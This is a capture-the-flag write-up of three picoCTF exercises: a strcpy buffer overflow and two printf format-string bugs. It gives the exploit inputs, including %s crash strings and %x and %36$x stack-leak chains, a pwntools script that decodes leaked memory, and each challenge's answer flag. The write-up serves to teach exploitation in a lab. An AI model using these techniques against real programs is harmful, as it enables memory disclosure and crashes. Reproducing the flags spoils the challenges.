# Buffer Overflow 0

On analysis of the given source code, I determined the following:
The flag is contained in `flag.txt` and is read into a `char` array `flag`
It reads an input from the user and on occurrence of a SIGSEGV error, it is handled by a function called `sigsegv_handler`
The program exits with a print message.

It is seen that whenever the input is a very large string(buffer overflow created), a sigsegv error is caused.
This seems to be because of the `strcpy` in the vuln function whenever it handles large strings.

The `sigsegv_handle` prints out the flag, so causing a buffer overflow is all you need to get the flag.

```
goosbo@pop-os:~$ nc saturn.picoctf.net 61459
Input: ffffffffffffffffffffffffffffffffffff
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
# Format String 0

On launching the instance, the following is printed:
```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
```

To choose the right answer, I analysed the code until found this block:
```c
char choice1[BUFSIZE];
scanf("%s", choice1);
char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
if (!on_menu(choice1, menu1, 3)) {
    printf("%s", "There is no such burger yet!\n");
    fflush(stdout);
} else {
    int count = printf(choice1);
    if (count > 2 * BUFSIZE) {
        serve_bob();
    } else {
        printf("%s\n%s\n",
                "Patrick is still hungry!",
                "Try to serve him something of larger size!");
        fflush(stdout);
    }
}
```

The first part of the code basically checks if the input is one of the 3 possible options and prints an appropriate statement if it is not. The interesting part is in the `else` block.

`int count = printf(choice1);` here the size of choice1 is being stored in count. The very next statement is `if (count > 2 * BUFSIZE)` which implies that we need a string of size greater than 64(BUFSIZE is 32) to not exit the program before we get the flag but our 3 options do not seem to have length greater than 64.

But then I noticed the option `"Gr%114d_Cheese"`. `%114` is a format specifier and when it is passed into a printf statement, the function expects a number of length 114. But if it does not find this number, it prints garbage values from memory. So this option helps us bypass the requirement of a 64 length input while also using a valid choice.

```
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```

```c
char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
```

The next stage does not have the same length requirements as before. But if we look at a function mentioned earlier:
```c
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
```

It is seen that the flag is printed if a sigsev error happens.

Just like before if we consider the only option with format specifiers which is `"Cla%sic_Che%s%steak"`, we should be able to access garbage values in memory. In this case `%s` which tries to access strings from memory might crash the program with a sigsev error and that seems to be the case.

```
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
```

flag: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}`

# flag leak

```python
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

On analyzing the vulnerable function in the file I notice that I could use format string vulnerability due to the dangerous use of `printf` with user input.

I could use format specifiers to get memory on the stack and that could contain the flag.

First I input a string of `%x` to get the values on the stack.
```
Tell me a story and then I'll tell you one >> %x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;
Here's a story - 
ffdd2030;ffdd2050;8049346;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;78253b78;3b78253b;253b7825;253b78;6f636970;7b465443;6b34334c;5f676e31;67346c46;6666305f;3474535f;
```

I notice that the repeated sequence of `253b7825;78253b78;3b78253b;` represents the input `%x;`. So the flag should start after this and is therefore `6f636970;7b465443;6b34334c;5f676e31;67346c46;6666305f;3474535f;`

On decoding this with the script:
```python
from pwn import *

s = '6f636970;7b465443;6b34334c;5f676e31;67346c46;6666305f;3474535f'

e = s.split(';')
m = b''
for i in e:
    m += p32(int(i,16))
print(m)
```

I get the output `b'picoCTF{L34k1ng_Fl4g_0ff_St4'`. It seems like I am not getting the full flag due to the 127 character limit of the input string.

I manually count and find out that `6f626970` which is the first value of the flag in stack memory is at the `36th` value of the stack.
I then use `%x` from the 36th value of the stack to an arbitrary end(in this case I checked until the 50th value of the stack).
```
Tell me a story and then I'll tell you one >> %36$x;%37$x;%38$x;%39$x;%40$x;%41$x;%42$x;%43$x;%44$x;%45$x;%46$x;%47$x;%48$x;%49$x;%50$x                                               
Here's a story - 
6f636970;7b465443;6b34334c;5f676e31;67346c46;6666305f;3474535f;395f6b63;32653939;7d343238;fbad2000;440b8200;0;ed541990;804c000
```

On running the same script,
```python
from pwn import *

s = '6f636970;7b465443;6b34334c;5f676e31;67346c46;6666305f;3474535f;395f6b63;32653939;7d343238;fbad2000;440b8200;0;ed541990;804c000'

e = s.split(';')
m = b''
for i in e:
    m += p32(int(i,16))
print(m)
```

I get the output: `b'picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}\x00 \xad\xfb\x00\x82\x0bD\x00\x00\x00\x00\x90\x19T\xed\x00\xc0\x04\x08'`

Therefore, the flag is `picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}`
